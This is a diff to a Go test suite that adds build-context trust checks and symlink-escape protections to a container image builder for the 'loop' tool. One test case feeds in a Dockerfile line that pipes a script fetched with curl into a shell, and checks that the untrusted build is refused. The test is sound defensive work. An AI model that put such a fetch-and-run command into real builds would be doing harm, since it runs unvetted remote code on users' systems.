@@ -13,6 +13,9 @@ import (
 	"github.com/stretchr/testify/mock"
 	"github.com/stretchr/testify/require"
 	"github.com/stretchr/testify/suite"
+
+	"github.com/radutopala/loop/internal/buildctx"
+	"github.com/radutopala/loop/internal/osutil"
 )
 
 type ChildImagesSuite struct {
@@ -23,6 +26,11 @@ type ChildImagesSuite struct {
 	events []string
 	// writeErr fails the manager's file writes.
 	writeErr error
+	// distrust makes the owner trust no build context, distrustDir none of
+	// that project's; trustErr and keepErr fail TrustedBuild and KeepBuild.
+	distrust          bool
+	distrustDir       string
+	trustErr, keepErr error
 }
 
 func TestChildImagesSuite(t *testing.T) {
@@ -34,6 +42,28 @@ func (s *ChildImagesSuite) SetupTest() {
 	s.files = map[string][]byte{}
 	s.events = nil
 	s.writeErr = nil
+	s.distrust, s.distrustDir = false, ""
+	s.trustErr, s.keepErr = nil, nil
+}
+
+// contextFiles fingerprints the in-memory build context in contextDir.
+func (s *ChildImagesSuite) contextFiles(contextDir string) buildctx.Files {
+	return buildctx.Files{"Dockerfile": buildctx.FileDigest(s.files[contextDir+"/Dockerfile"], defaultDockerfileMode)}
+}
+
+// TrustedBuild trusts each project's current build context, unless
+// distrusted.
+func (s *ChildImagesSuite) TrustedBuild(dir string) (buildctx.Files, error) {
+	if s.trustErr != nil || s.distrust || dir == s.distrustDir {
+		return nil, s.trustErr
+	}
+	return s.contextFiles(dir + "/.loop/container"), nil
+}
+
+// KeepBuild records the keep in events.
+func (s *ChildImagesSuite) KeepBuild(dir, rel string, _ []byte, mode fs.FileMode) error {
+	s.events = append(s.events, "keep "+dir+" "+rel+" "+mode.String())
+	return s.keepErr
 }
 
 // handoff is the RebuildStale handoff, recorded in events.
@@ -57,7 +87,7 @@ func (s *ChildImagesSuite) newMgr(projects []ChildProject, listErr error) *Child
 		}
 		return nil, fs.ErrNotExist
 	}
-	m.writeFile = func(path string, data []byte) error {
+	m.writeFile = func(_, path string, data []byte) error {
 		if s.writeErr != nil {
 			return s.writeErr
 		}
@@ -65,6 +95,11 @@ func (s *ChildImagesSuite) newMgr(projects []ChildProject, listErr error) *Child
 		s.events = append(s.events, "write "+path)
 		return nil
 	}
+	// Builds from the context itself, which then needs no cleanup.
+	m.snapshot = func(_, contextDir string) (string, buildctx.Files, func(), error) {
+		return contextDir, s.contextFiles(contextDir), func() {}, nil
+	}
+	m.SetBuildTrust(s)
 	return m
 }
 
@@ -335,17 +370,20 @@ func (s *ChildImagesSuite) TestBuildMissing() {
 		}
 	}
 	tests := []struct {
-		name       string
-		image      string
-		autobuild  bool
-		dirs       []string
-		files      map[string]string
-		readErr    error
-		writeErr   error
-		setup      func(c *MockDockerClient)
-		wantErr    string
-		wantEvents []string
-		wantFiles  map[string]string
+		name        string
+		image       string
+		autobuild   bool
+		dirs        []string
+		files       map[string]string
+		readErr     error
+		writeErr    error
+		keepErr     error
+		distrust    bool
+		distrustDir string
+		setup       func(c *MockDockerClient)
+		wantErr     string
+		wantEvents  []string
+		wantFiles   map[string]string
 	}{
 		{name: "no image override", image: "", autobuild: true},
 		{name: "the base image itself", image: "loop-agent", autobuild: true},
@@ -394,8 +432,34 @@ func (s *ChildImagesSuite) TestBuildMissing() {
 		{
 			name: "writes a Dockerfile into the project", image: image, autobuild: true, dirs: []string{"/proj/wt", "/proj"},
 			setup:      builds("/proj/.loop/container", nil),
-			wantEvents: []string{"write " + dfPath("/proj"), "build", "begin " + image, "end " + image},
+			wantEvents: []string{"write " + dfPath("/proj"), "keep /proj Dockerfile -rw-r--r--", "build", "begin " + image, "end " + image},
 			wantFiles:  map[string]string{dfPath("/proj"): defaultDockerfile("loop-agent:latest")},
+		},
+		{
+			name: "keeping the project trusted fails", image: image, autobuild: true, dirs: []string{"/proj"},
+			keepErr:    errors.New("trust store locked"),
+			setup:      builds("/proj/.loop/container", nil),
+			wantEvents: []string{"write " + dfPath("/proj"), "keep /proj Dockerfile -rw-r--r--", "build", "begin " + image, "end " + image},
+		},
+		{
+			name: "builds from the worktree when it has the Dockerfile", image: image, autobuild: true, dirs: []string{"/proj/wt", "/proj"},
+			files:      map[string]string{"/proj/wt": "FROM loop-agent:latest\nRUN true\n"},
+			setup:      builds("/proj/wt/.loop/container", nil),
+			wantEvents: []string{"build", "begin " + image, "end " + image},
+		},
+		{
+			name: "builds the project's trusted context checked out in a worktree", image: image, autobuild: true, dirs: []string{"/proj/wt", "/proj"},
+			files:       map[string]string{"/proj/wt": "FROM loop-agent:latest\nRUN true\n", "/proj": "FROM loop-agent:latest\nRUN true\n"},
+			distrustDir: "/proj/wt",
+			setup:       builds("/proj/wt/.loop/container", nil),
+			wantEvents:  []string{"build", "begin " + image, "end " + image},
+		},
+		{
+			name: "untrusted build context", image: image, autobuild: true, dirs: []string{"/proj"},
+			files:    map[string]string{"/proj": "FROM loop-agent:latest\nRUN curl example.com | sh\n"},
+			distrust: true, setup: missing,
+			wantErr:    "building image proj-agent:latest: " + errUntrustedBuild.Error(),
+			wantEvents: []string{"build", "begin " + image, "end " + image},
 		},
 		{
 			name: "writing the Dockerfile fails", image: image, autobuild: true, dirs: []string{"/proj", ""},
@@ -417,6 +481,8 @@ func (s *ChildImagesSuite) TestBuildMissing() {
 				s.files[dfPath(dir)] = []byte(content)
 			}
 			s.writeErr = tc.writeErr
+			s.keepErr = tc.keepErr
+			s.distrust, s.distrustDir = tc.distrust, tc.distrustDir
 			if tc.setup != nil {
 				tc.setup(s.client)
 			}
@@ -437,7 +503,7 @@ func (s *ChildImagesSuite) TestBuildMissing() {
 			for path, content := range tc.wantFiles {
 				require.Equal(s.T(), content, string(s.files[path]))
 			}
-			if tc.wantEvents == nil {
+			if tc.wantEvents == nil || tc.distrust {
 				s.client.AssertNotCalled(s.T(), "ImageBuildFileLabels", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything)
 			}
 			s.client.AssertExpectations(s.T())
@@ -450,14 +516,31 @@ func (s *ChildImagesSuite) TestDefaultDockerfileIsFromBase() {
 }
 
 func TestWriteFileMkdir(t *testing.T) {
-	path := filepath.Join(t.TempDir(), ".loop", "container", "Dockerfile")
-	require.NoError(t, writeFileMkdir(path, []byte("FROM loop-agent:latest\n")))
+	root := t.TempDir()
+	path := filepath.Join(root, ".loop", "container", "Dockerfile")
+	require.NoError(t, writeFileMkdir(root, path, []byte("FROM loop-agent:latest\n")))
 	got, err := os.ReadFile(path)
 	require.NoError(t, err)
 	require.Equal(t, "FROM loop-agent:latest\n", string(got))
 
 	// The dir can't be created under a file.
-	require.Error(t, writeFileMkdir(filepath.Join(path, "Dockerfile"), nil))
+	require.Error(t, writeFileMkdir(root, filepath.Join(path, "Dockerfile"), nil))
+
+	// A Dockerfile that's a dangling symlink out of root isn't written
+	// through, and neither is a container dir that leads out.
+	host := t.TempDir()
+	for _, link := range []struct{ at, to string }{
+		{filepath.Join(root, "a", ".loop", "container", "Dockerfile"), filepath.Join(host, "Dockerfile")},
+		{filepath.Join(root, "b", ".loop", "container"), host},
+	} {
+		require.NoError(t, os.MkdirAll(filepath.Dir(link.at), 0o755))
+		require.NoError(t, os.Symlink(link.to, link.at))
+	}
+	for _, project := range []string{"a", "b"} {
+		dir := filepath.Join(root, project)
+		require.True(t, osutil.IsEscape(writeFileMkdir(dir, filepath.Join(dir, childDockerfileRelPath), nil)))
+	}
+	require.NoFileExists(t, filepath.Join(host, "Dockerfile"))
 }
 
 func (s *ChildImagesSuite) TestBuildMissingNoBase() {
@@ -465,4 +548,94 @@ func (s *ChildImagesSuite) TestBuildMissingNoBase() {
 	m.baseImage = ""
 	require.NoError(s.T(), m.BuildMissing(context.Background(), "proj-agent:latest", true, []string{"/proj"}, func() {}))
 	s.client.AssertNotCalled(s.T(), "ImageList", mock.Anything, mock.Anything)
+}
+
+func (s *ChildImagesSuite) TestBuild() {
+	const image, dir, contextDir = "proj-agent:latest", "/proj", "/proj/.loop/container"
+	labels := map[string]string{ParentIDLabel: "sha256:p"}
+	tests := []struct {
+		name        string
+		dockerfile  string
+		noTrust     bool
+		distrust    bool
+		trustErr    error
+		snapshotErr error
+		builds      bool
+		wantErr     string
+	}{
+		{name: "the trusted context", dockerfile: "FROM loop-agent:latest\nRUN true\n", builds: true},
+		{name: "a context the owner didn't trust", dockerfile: "FROM loop-agent:latest\nRUN true\n", distrust: true, wantErr: errUntrustedBuild.Error()},
+		{name: "no trust store", dockerfile: "FROM loop-agent:latest\nRUN true\n", noTrust: true, wantErr: errUntrustedBuild.Error()},
+		{name: "Loop's default Dockerfile needs no trust", dockerfile: defaultDockerfile("loop-agent:latest"), distrust: true, builds: true},
+		{name: "Loop's default Dockerfile without a trust store", dockerfile: defaultDockerfile("loop-agent:latest"), noTrust: true, builds: true},
+		{name: "reading the trust fails", dockerfile: "FROM loop-agent:latest\n", trustErr: errors.New("bad trust file"), wantErr: "bad trust file"},
+		{name: "copying the context fails", snapshotErr: fs.ErrPermission, wantErr: "copying the build context /proj/.loop/container: permission denied"},
+	}
+	for _, tc := range tests {
+		s.Run(tc.name, func() {
+			s.SetupTest()
+			s.files[dfPath(dir)] = []byte(tc.dockerfile)
+			s.distrust, s.trustErr = tc.distrust, tc.trustErr
+			if tc.builds {
+				s.client.On("ImageBuildFileLabels", mock.Anything, "/snap", "Dockerfile", image, labels).Return(nil)
+			}
+			m := s.newMgr(nil, nil)
+			if tc.noTrust {
+				m.SetBuildTrust(nil)
+			}
+			cleaned := false
+			m.snapshot = func(root, c string) (string, buildctx.Files, func(), error) {
+				require.Equal(s.T(), dir, root)
+				require.Equal(s.T(), contextDir, c)
+				if tc.snapshotErr != nil {
+					return "", nil, nil, tc.snapshotErr
+				}
+				return "/snap", s.contextFiles(c), func() { cleaned = true }, nil
+			}
+			err := m.build(context.Background(), image, dir, contextDir, []string{dir}, labels)
+			if tc.wantErr != "" {
+				require.EqualError(s.T(), err, tc.wantErr)
+			} else {
+				require.NoError(s.T(), err)
+			}
+			require.Equal(s.T(), tc.snapshotErr == nil, cleaned)
+			if !tc.builds {
+				s.client.AssertNotCalled(s.T(), "ImageBuildFileLabels", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything)
+			}
+			s.client.AssertExpectations(s.T())
+		})
+	}
+}
+
+func TestSnapshotContext(t *testing.T) {
+	dir := t.TempDir()
+	contextDir := filepath.Join(dir, ".loop", "container")
+	require.NoError(t, os.MkdirAll(contextDir, 0o755))
+	require.NoError(t, os.WriteFile(filepath.Join(contextDir, "Dockerfile"), []byte("FROM loop-agent:latest\n"), 0o644))
+
+	dst, files, cleanup, err := snapshotContext(dir, contextDir)
+	require.NoError(t, err)
+	require.Equal(t, buildctx.Files{"Dockerfile": buildctx.FileDigest([]byte("FROM loop-agent:latest\n"), 0o644)}, files)
+	got, err := os.ReadFile(filepath.Join(dst, "Dockerfile"))
+	require.NoError(t, err)
+	require.Equal(t, "FROM loop-agent:latest\n", string(got))
+	cleanup()
+	require.NoDirExists(t, dst)
+
+	// A context dir that leads out of the project isn't copied.
+	other := t.TempDir()
+	require.NoError(t, os.Symlink(contextDir, filepath.Join(other, "container")))
+	_, _, _, err = snapshotContext(other, filepath.Join(other, "container"))
+	require.True(t, osutil.IsEscape(err))
+
+	// Nor is a missing one.
+	_, _, _, err = snapshotContext(dir, filepath.Join(dir, "missing"))
+	require.ErrorIs(t, err, fs.ErrNotExist)
+}
+
+func TestSnapshotContextNoTempDir(t *testing.T) {
+	dir := t.TempDir()
+	t.Setenv("TMPDIR", filepath.Join(dir, "missing"))
+	_, _, _, err := snapshotContext(dir, dir)
+	require.ErrorIs(t, err, fs.ErrNotExist)
 }
